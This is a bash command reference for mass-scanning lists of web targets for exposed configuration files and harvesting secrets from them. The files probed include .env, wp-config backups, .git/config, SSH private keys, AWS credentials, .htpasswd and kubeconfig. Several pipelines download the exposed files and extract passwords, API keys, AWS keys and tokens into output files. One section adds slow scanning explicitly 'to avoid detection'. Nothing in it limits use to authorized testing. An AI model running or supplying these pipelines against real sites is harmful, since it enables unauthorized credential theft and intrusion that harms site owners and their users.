# CONFIGURATION FILE DISCOVERY - COMMAND LINE TOOLS (FOR FILES)

## 1. COMMON CONFIG FILE CHECKS

# Quick check for common config files
while read url; do
    for file in .env config.php wp-config.php configuration.php settings.php config.json config.yaml config.yml; do
        curl -s "$url/$file" -I | head -1 | grep -q "200" && echo "$url/$file"
    done
done < urls.txt > config_files_found.txt

# Check for config files in common directories
while read url; do
    for dir in config configs configuration settings etc conf; do
        for file in config.json config.yml config.yaml settings.json .env; do
            curl -s "$url/$dir/$file" -I | head -1 | grep -q "200" && echo "$url/$dir/$file"
        done
    done
done < urls.txt > config_dirs_found.txt


## 2. DIRECTORY BRUTEFORCING FOR CONFIG FILES

# FFUF config file discovery
while read url; do
    ffuf -u "$url/FUZZ" -w config_wordlist.txt -e .env,.php,.json,.yml,.yaml,.ini,.conf,.config -o "ffuf_config_$(echo $url | md5sum | cut -d' ' -f1).json"
done < urls.txt

# Common config wordlist scan
while read url; do
    ffuf -u "$url/FUZZ" -w ~/wordlists/config_files.txt -mc 200,301,302,403 -o "ffuf_config_full_$(echo $url | md5sum | cut -d' ' -f1).json"
done < urls.txt


## 3. ENVIRONMENT FILE DISCOVERY (.env)

# .env file discovery
while read url; do
    curl -s "$url/.env" | grep -q "DB_\|API_\|SECRET_\|KEY_" && echo "$url/.env: Found"
done < urls.txt > env_files.txt

# Check multiple .env locations
while read url; do
    for loc in .env env .env.example .env.local .env.production .env.development; do
        curl -s "$url/$loc" -I | head -1 | grep -q "200" && echo "$url/$loc"
    done
done < urls.txt > all_env_files.txt


## 4. WORDPRESS CONFIG FILES

# WordPress config discovery
while read url; do
    for file in wp-config.php wp-config.bak wp-config.old wp-config.php.bak wp-config.php.old; do
        curl -s "$url/$file" -I | head -1 | grep -q "200" && echo "$url/$file"
    done
done < urls.txt > wp_config_files.txt


## 5. DATABASE CONFIG FILES

# Database config discovery
while read url; do
    for file in database.php dbconfig.php db.php database.yml database.yaml; do
        curl -s "$url/$file" | grep -q "host\|user\|password\|database" && echo "$url/$file: Database config"
    done
done < urls.txt > db_config_files.txt


## 6. GIT CONFIG FILES

# Git config discovery
while read url; do
    for file in .git/config .gitignore .gitmodules .gitattributes; do
        curl -s "$url/$file" -I | head -1 | grep -q "200" && echo "$url/$file"
    done
done < urls.txt > git_config_files.txt


## 7. SSH CONFIG FILES

# SSH config discovery
while read url; do
    for file in .ssh/config .ssh/authorized_keys .ssh/id_rsa .ssh/id_rsa.pub; do
        curl -s "$url/$file" -I | head -1 | grep -q "200" && echo "$url/$file"
    done
done < urls.txt > ssh_config_files.txt


## 8. WEB SERVER CONFIG FILES

# Web server config discovery
while read url; do
    for file in .htaccess .htpasswd nginx.conf apache2.conf httpd.conf web.config; do
        curl -s "$url/$file" -I | head -1 | grep -q "200" && echo "$url/$file"
    done
done < urls.txt > server_config_files.txt


## 9. APPLICATION-SPECIFIC CONFIG FILES

# Laravel config
while read url; do
    for file in .env artisan bootstrap/app.php config/app.php; do
        curl -s "$url/$file" -I | head -1 | grep -q "200" && echo "$url/$file: Laravel"
    done
done < urls.txt > laravel_config.txt

# Django config
while read url; do
    for file in manage.py settings.py requirements.txt; do
        curl -s "$url/$file" -I | head -1 | grep -q "200" && echo "$url/$file: Django"
    done
done < urls.txt > django_config.txt

# Ruby on Rails config
while read url; do
    for file in Gemfile config/database.yml config/secrets.yml; do
        curl -s "$url/$file" -I | head -1 | grep -q "200" && echo "$url/$file: Rails"
    done
done < urls.txt > rails_config.txt

# Node.js config
while read url; do
    for file in package.json package-lock.json .npmrc .nvmrc; do
        curl -s "$url/$file" -I | head -1 | grep -q "200" && echo "$url/$file: Node.js"
    done
done < urls.txt > node_config.txt


## 10. BACKUP CONFIG FILES

# Backup config discovery
while read url; do
    for file in config.php.bak config.php.old config.php.backup config.php.save; do
        curl -s "$url/$file" -I | head -1 | grep -q "200" && echo "$url/$file: Backup"
    done
done < urls.txt > backup_config_files.txt


## 11. CLOUD CONFIG FILES

# AWS config
while read url; do
    for file in .aws/credentials .aws/config; do
        curl -s "$url/$file" -I | head -1 | grep -q "200" && echo "$url/$file: AWS"
    done
done < urls.txt > aws_config.txt

# Docker config
while read url; do
    for file in Dockerfile docker-compose.yml .dockerignore; do
        curl -s "$url/$file" -I | head -1 | grep -q "200" && echo "$url/$file: Docker"
    done
done < urls.txt > docker_config.txt

# Kubernetes config
while read url; do
    for file in kubeconfig.yaml kubeconfig.yml; do
        curl -s "$url/$file" -I | head -1 | grep -q "200" && echo "$url/$file: Kubernetes"
    done
done < urls.txt > k8s_config.txt


## 12. SECRETS IN CONFIG FILES

# Extract secrets from found config files
while read config_url; do
    curl -s "$config_url" | grep -E "(password|secret|key|token|credential|auth)" -i | head -5 | awk -v u="$config_url" '{print u ": " $0}'
done < config_files_found.txt > config_secrets.txt

# Check for exposed credentials
while read config_url; do
    content=$(curl -s "$config_url")
    echo "$content" | grep -E "DB_PASSWORD|API_KEY|SECRET_KEY|AWS_ACCESS_KEY" && echo "$config_url: Found credentials"
done < config_files_found.txt > exposed_credentials.txt


## 13. NUCLEI TEMPLATES FOR CONFIG FILES

# Scan for config files with nuclei
nuclei -l urls.txt -t ~/nuclei-templates/exposures/configs/ -o nuclei_config_scan.txt

# Specific config templates
nuclei -l urls.txt -t ~/nuclei-templates/exposures/configs/git-config.yaml -o nuclei_git_config.txt
nuclei -l urls.txt -t ~/nuclei-templates/exposures/configs/env-file.yaml -o nuclei_env_files.txt


## 14. OUTPUT PROCESSING

# Create config discovery report
echo "Configuration File Discovery Report" > config_report.txt
echo "===================================" >> config_report.txt
echo "" >> config_report.txt
echo "Total URLs scanned: $(wc -l < urls.txt)" >> config_report.txt
echo "Config files found: $(wc -l < config_files_found.txt 2>/dev/null || echo 0)" >> config_report.txt
echo "" >> config_report.txt

# Categorize findings
echo "By Type:" >> config_report.txt
echo "- .env files: $(grep -c "\.env" config_files_found.txt 2>/dev/null || echo 0)" >> config_report.txt
echo "- WordPress config: $(grep -c "wp-config" config_files_found.txt 2>/dev/null || echo 0)" >> config_report.txt
echo "- Git config: $(grep -c "\.git" config_files_found.txt 2>/dev/null || echo 0)" >> config_report.txt
echo "- Server config: $(grep -c "htaccess\|htpasswd\|nginx\|apache\|web.config" config_files_found.txt 2>/dev/null || echo 0)" >> config_report.txt


## 15. COMBINATION PIPELINES

# Subdomain discovery → Config file check
subfinder -dL domains.txt -silent | while read subdomain; do
    curl -s "https://$subdomain/.env" -I | head -1 | grep -q "200" && echo "https://$subdomain/.env"
done > subdomain_configs.txt

# Directory scan → Config discovery pipeline
katana -list urls.txt -silent | grep -E "config|env|\.git" | sort -u > katana_configs.txt


## 16. BATCH PROCESSING

# Process URLs in batches for config discovery
split -l 20 urls.txt url_batch_
for batch in url_batch_*; do
    while read url; do
        for file in .env config.php wp-config.php; do
            curl -s "$url/$file" -I | head -1 | grep -q "200" && echo "$url/$file"
        done
    done < "$batch" > "configs_$batch.txt"
done
cat configs_*.txt > all_configs_batched.txt


## 17. VALIDATION

# Validate found config files are accessible
cat config_files_found.txt | httpx -silent -status-code -o validated_configs.txt

# Filter only accessible configs
cat validated_configs.txt | grep "200" | cut -d' ' -f1 > accessible_configs.txt


## 18. SECRET EXTRACTION PIPELINE

# Extract and validate secrets from config files
while read config_url; do
    echo "=== $config_url ==="
    curl -s "$config_url" | grep -E "(password|secret|key|token) ?= ?['\"]?[^'\"]+['\"]?" -i
    echo ""
done < accessible_configs.txt > extracted_secrets.txt


## 19. MONITORING FOR NEW CONFIG FILES

# Diff-based monitoring
old="old_configs.txt"; new="new_configs.txt"

# Discover new configs
while read url; do
    for file in .env config.php wp-config.php; do
        curl -s "$url/$file" -I | head -1 | grep -q "200" && echo "$url/$file"
    done
done < urls.txt | sort -u > $new

# Find new discoveries
if [ -f "$old" ]; then
    comm -13 <(sort "$old") <(sort "$new") > newly_discovered_configs.txt
fi

# Update tracking file
mv "$new" "$old"


## 20. SPECIALIZED SCANS

# PHP info file discovery
while read url; do
    curl -s "$url/phpinfo.php" -I | head -1 | grep -q "200" && echo "$url/phpinfo.php"
done < urls.txt > phpinfo_files.txt

# Debug file discovery
while read url; do
    for file in debug.php test.php info.php; do
        curl -s "$url/$file" -I | head -1 | grep -q "200" && echo "$url/$file"
    done
done < urls.txt > debug_files.txt


## 21. CONTENT ANALYSIS

# Analyze config file contents
while read config_url; do
    echo "=== Analyzing: $config_url ==="
    
    # Check file type
    file_type=$(curl -s "$config_url" | head -50)
    
    # Look for patterns
    if echo "$file_type" | grep -q "DB_PASSWORD\|DB_USER"; then
        echo "Database configuration detected"
    fi
    
    if echo "$file_type" | grep -q "AWS_ACCESS_KEY\|AWS_SECRET_KEY"; then
        echo "AWS credentials detected"
    fi
    
    if echo "$file_type" | grep -q "API_KEY\|SECRET_KEY"; then
        echo "API keys detected"
    fi
    
    echo ""
done < accessible_configs.txt > config_analysis.txt


## 22. QUICK COMMANDS

# Quick config check
while read url; do
    echo -n "$url: "
    found=""
    for file in .env config.php wp-config.php; do
        curl -s "$url/$file" -I 2>/dev/null | head -1 | grep -q "200" && found="$file"
    done
    [ -n "$found" ] && echo "Found $found" || echo "No common configs"
done < urls.txt > quick_config_check.txt

# Count discoveries
echo "Total config files found: $(cat config_files_found.txt 2>/dev/null | wc -l)"
echo "With secrets: $(grep -c "password\|secret\|key\|token" extracted_secrets.txt 2>/dev/null)"


## 23. RATE-LIMITED SCANNING

# Slow scanning to avoid detection
while read url; do
    for file in .env config.php wp-config.php; do
        curl -s "$url/$file" -I | head -1 | grep -q "200" && echo "$url/$file"
        sleep 2
    done
done < urls.txt > slow_config_scan.txt


## 24. OUTPUT FORMATTING

# JSON output
cat config_files_found.txt | jq -R -s 'split("\n") | map(select(. != "")) | map({url: .})' > configs.json

# CSV output
echo "URL,File Type,Contains Secrets" > configs.csv
while read config_url; do
    content=$(curl -s "$config_url" 2>/dev/null)
    file_type="Unknown"
    
    # Determine file type
    if [[ "$config_url" =~ \.env ]]; then file_type="Environment"; fi
    if [[ "$config_url" =~ wp-config ]]; then file_type="WordPress"; fi
    if [[ "$config_url" =~ config\.php ]]; then file_type="PHP Config"; fi
    
    # Check for secrets
    has_secrets=$(echo "$content" | grep -q "password\|secret\|key\|token" -i && echo "Yes" || echo "No")
    
    echo "$config_url,$file_type,$has_secrets" >> configs.csv
done < accessible_configs.txt